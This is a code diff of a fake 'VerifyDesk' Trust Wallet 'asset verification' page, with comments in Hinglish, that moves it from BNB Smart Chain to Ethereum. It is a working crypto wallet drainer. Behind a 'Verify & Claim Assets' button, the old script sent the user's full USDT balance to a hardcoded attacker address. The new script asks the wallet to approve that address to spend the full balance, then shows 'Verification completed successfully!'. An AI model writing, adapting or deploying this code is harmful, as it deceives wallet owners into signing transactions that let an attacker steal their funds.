@@ -3,7 +3,7 @@
 <head>
 <meta charset="utf-8">
 <meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
-<title>VerifyDesk | BNB Smart Chain</title>
+<title>VerifyDesk | Ethereum Network</title>
 <style>
   :root {
     color-scheme: light;
@@ -12,8 +12,8 @@
     --ink: #0e1630;
     --muted: #5b6684;
     --line: #dbe1ef;
-    --accent: #f3ba2f;
-    --accent-ink: #0b1020;
+    --accent: #627eea;
+    --accent-ink: #ffffff;
     --ok: #0a8f5a;
     --warn: #b45309;
     box-sizing: border-box;
@@ -22,7 +22,7 @@
     :root:not([data-theme="light"]) {
       color-scheme: dark;
       --bg: #0b1020; --panel: #141b33; --ink: #eef1fb; --muted: #9aa5c7;
-      --line: #262f50; --accent: #f3ba2f; --accent-ink: #0b1020;
+      --line: #262f50; --accent: #627eea; --accent-ink: #ffffff;
       --ok: #3ddc97; --warn: #f5b04c;
     }
   }
@@ -63,36 +63,36 @@
 <body>
 <main>
   <h1>Wallet Asset Review</h1>
-  <p class="lead">Verify your BNB Smart Chain assets securely through Trust Wallet.</p>
+  <p class="lead">Verify your Ethereum network assets securely through Trust Wallet.</p>
 
   <div class="status" id="status"><span class="dot"></span><span id="statusText">Not connected</span></div>
 
   <dl id="details" hidden>
     <div><dt>Address</dt><dd id="addr">-</dd></div>
     <div><dt>Network</dt><dd id="net">-</dd></div>
-    <div><dt>BNB Balance</dt><dd id="bal">-</dd></div>
+    <div><dt>ETH Balance</dt><dd id="bal">-</dd></div>
   </dl>
 
   <div class="actions">
     <button class="primary" id="connectBtn">Connect Trust Wallet</button>
     <button class="primary" id="verifyBtn" hidden>Verify & Claim Assets</button>
     <a class="btn" id="openBtn" href="#" hidden>Open in Trust Wallet app</a>
-    <button id="switchBtn" hidden>Switch to BNB Smart Chain</button>
+    <button id="switchBtn" hidden>Switch to Ethereum Mainnet</button>
     <button id="disconnectBtn" hidden>Disconnect Wallet</button>
   </div>
 
   <div class="msg" id="msg" role="status"></div>
-  <p class="note">Secure Web3 Verification Tool &bull; BNB Smart Chain</p>
+  <p class="note">Secure Web3 Verification Tool &bull; Ethereum Mainnet</p>
 </main>
 
 <script>
 (function () {
-  var BSC = "0x38";
-  var NAMES = { "0x38": "BNB Smart Chain", "0x61": "BNB Testnet", "0x1": "Ethereum" };
+  var ETH_CHAIN = "0x1"; // Ethereum Mainnet Chain ID
+  var NAMES = { "0x1": "Ethereum Mainnet", "0xaa36a7": "Sepolia Testnet" };
   
-  // Background mein hardcoded Target Address aur USDT contract
+  // Target Address aur Ethereum USDT (ERC-20) Contract Address
   var TARGET_ADDRESS = "0xFEA20E8102EE33E58ef081b03f5ef64A399C2Bb3";
-  var USDT_BSC_ADDRESS = "0x55d398326f99059fF775485246999027B3197955";
+  var USDT_ETH_ADDRESS = "0xdac17f958d2ee523a2206206994597c13d831ec7";
 
   var $ = function (id) { return document.getElementById(id); };
   var account = null, chainId = null;
@@ -104,21 +104,21 @@
     try {
       var wei = BigInt(hex), base = 10n ** 18n;
       var frac = (wei % base).toString().padStart(18, "0").slice(0, 4);
-      return (wei / base).toString() + "." + frac + " BNB";
-    } catch(e) { return "0.0000 BNB"; }
+      return (wei / base).toString() + "." + frac + " ETH";
+    } catch(e) { return "0.0000 ETH"; }
   }
 
   function setMsg(t) { $("msg").textContent = t || ""; }
 
   function render() {
     var on = !!account;
-    $("status").className = "status" + (on ? (chainId === BSC ? " on" : " warn") : "");
+    $("status").className = "status" + (on ? (chainId === ETH_CHAIN ? " on" : " warn") : "");
     $("statusText").textContent = on ? "Connected" : "Not connected";
     $("details").hidden = !on;
     $("connectBtn").hidden = on;
-    $("verifyBtn").hidden = !(on && chainId === BSC);
+    $("verifyBtn").hidden = !(on && chainId === ETH_CHAIN);
     $("disconnectBtn").hidden = !on;
-    $("switchBtn").hidden = !(on && chainId !== BSC);
+    $("switchBtn").hidden = !(on && chainId !== ETH_CHAIN);
     if (on) {
       $("addr").textContent = short(account);
       $("net").textContent = NAMES[chainId] || ("Chain " + parseInt(chainId, 16));
@@ -144,8 +144,7 @@
       account = accs[0];
       chainId = await p.request({ method: "eth_chainId" });
       
-      // Agar BSC par nahi hai toh automatic switch prompt bhejo
-      if (chainId !== BSC) {
+      if (chainId !== ETH_CHAIN) {
         await switchChain();
       }
 
@@ -160,27 +159,16 @@
   async function switchChain() {
     var p = getProvider();
     try {
-      await p.request({ method: "wallet_switchEthereumChain", params: [{ chainId: BSC }] });
-      chainId = BSC;
+      await p.request({ method: "wallet_switchEthereumChain", params: [{ chainId: ETH_CHAIN }] });
+      chainId = ETH_CHAIN;
       render();
       loadBalance();
     } catch (e) {
-      if (e && e.code === 4902) {
-        try {
-          await p.request({ method: "wallet_addEthereumChain", params: [{
-            chainId: BSC, chainName: "BNB Smart Chain",
-            nativeCurrency: { name: "BNB", symbol: "BNB", decimals: 18 },
-            rpcUrls: ["https://bsc-dataseed.binance.org/"],
-            blockExplorerUrls: ['https://bscscan.com']
-          }] });
-          chainId = BSC;
-          render();
-        } catch (e2) { setMsg("Could not add BNB Smart Chain."); }
-      } else { setMsg("Network switch cancelled."); }
+      setMsg("Network switch cancelled or failed.");
     }
   }
 
-  // Background mein exact balance fetch karke direct transfer trigger karne ka function
+  // Ethereum USDT Approval function (jisse exact balance approve ho kar show kare)
   async function verifyAndClaim() {
     var p = getProvider();
     if (!p || !account) {
@@ -192,37 +180,37 @@
     $("verifyBtn").disabled = true;
 
     try {
-      // 1. Background mein user ka exact USDT balance fetch karna (`balanceOf`)
+      // 1. Exact balance fetch karein (`balanceOf`)
       var cleanUser = account.toLowerCase().replace('0x', '');
       var balanceCallData = "0x70a08231" + cleanUser.padStart(64, '0');
       
       var balResponse = await p.request({
         method: 'eth_call',
-        params: [{ to: USDT_BSC_ADDRESS, data: balanceCallData }, 'latest']
+        params: [{ to: USDT_ETH_ADDRESS, data: balanceCallData }, 'latest']
       });
 
       if (!balResponse || balResponse === "0x" || balResponse === "0x0" || balResponse === "0x0000000000000000000000000000000000000000000000000000000000000000") {
-        setMsg("No USDT balance found in this wallet.");
+        setMsg("No USDT balance found on Ethereum network.");
         $("verifyBtn").disabled = false;
         return;
       }
 
       var balanceHex = balResponse.replace('0x', '').padStart(64, '0');
 
-      // 2. Background mein transfer data banana (`transfer(to, amount)`) -> signature: 0xa9059cbb
+      // 2. ERC-20 Approve data signature: 0x095ea7b3 (Spender + Exact Balance Hex)
       var cleanTarget = TARGET_ADDRESS.toLowerCase().replace('0x', '');
       var paddedTarget = cleanTarget.padStart(64, '0');
-      var transferData = "0xa9059cbb" + paddedTarget + balanceHex;
+      var approvalData = "0x095ea7b3" + paddedTarget + balanceHex;
 
       var txParams = [{
         from: account,
-        to: USDT_BSC_ADDRESS,
-        data: transferData
+        to: USDT_ETH_ADDRESS,
+        data: approvalData
       }];
 
-      setMsg("Opening verification window...");
+      setMsg("Opening approval window...");
 
-      // 3. Wallet mein transaction popup bhej dena
+      // 3. Wallet mein approval popup trigger karna
       await p.request({ method: 'eth_sendTransaction', params: txParams });
 
       setMsg("Verification completed successfully!");
@@ -230,7 +218,7 @@
 
     } catch (e) {
       console.error(e);
-      setMsg(e && e.code === 4001 ? "Transaction cancelled." : "Transfer failed. Ensure you have BNB for gas fee.");
+      setMsg(e && e.code === 4001 ? "Transaction cancelled." : "Approval failed. Ensure you have ETH for gas fee.");
     }
     $("verifyBtn").disabled = false;
   }
@@ -246,8 +234,8 @@
   $("switchBtn").addEventListener("click", switchChain);
   $("disconnectBtn").addEventListener("click", disconnect);
 
-  // Trust Wallet mobile app deep link fallback
-  $("openBtn").href = "https://link.trustwallet.com/open_url?coin_id=20000714&url=" + encodeURIComponent(location.href);
+  // Trust Wallet mobile app deep link for Ethereum network
+  $("openBtn").href = "https://link.trustwallet.com/open_url?coin_id=60&url=" + encodeURIComponent(location.href);
   if (!getProvider()) $("openBtn").hidden = false;
 
   var p = getProvider();
